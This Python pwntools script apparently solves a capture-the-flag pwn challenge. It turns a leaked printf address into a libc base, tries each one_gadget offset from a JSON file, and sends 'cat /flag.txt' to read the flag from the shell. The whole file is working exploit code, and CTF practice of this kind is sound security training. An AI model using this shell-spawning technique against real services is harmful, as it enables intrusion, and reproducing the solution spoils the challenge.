import os

nc, host, port = os.getenv("CONNECT").split(" ")

from pwn import remote, context
import json

context.log_level = "error"


def try_one_gadget(offset):
    with remote(host, port) as conn:
        conn.recvuntil(b"printf @ ")
        printf_runtime_addr = int(conn.recvline().strip().decode(), 16)

        print(f"Trying one gadget at offset: {hex(offset)}")
        print(f"printf runtime address: {hex(printf_runtime_addr)}")

        printf_offset = 0x60100
        base_addr = printf_runtime_addr - printf_offset

        conn.sendlineafter(b"> ", hex(base_addr + offset).encode())
        conn.sendline(b"cat /flag.txt")
        conn.sendline(b"exit")
        return conn.recvall().decode()


with open("gadgets.json") as f:
    gadgets = json.load(f)

for gadget in gadgets:
    print(f"value: {hex(gadget['value'])}")
    print(f"effect: {gadget['effect']}")
    print("constraints:")
    for constraint in gadget["constraints"]:
        print(f"  - {constraint}")
    result = try_one_gadget(gadget["value"])
    print(f"Result: {result}")
    print("")
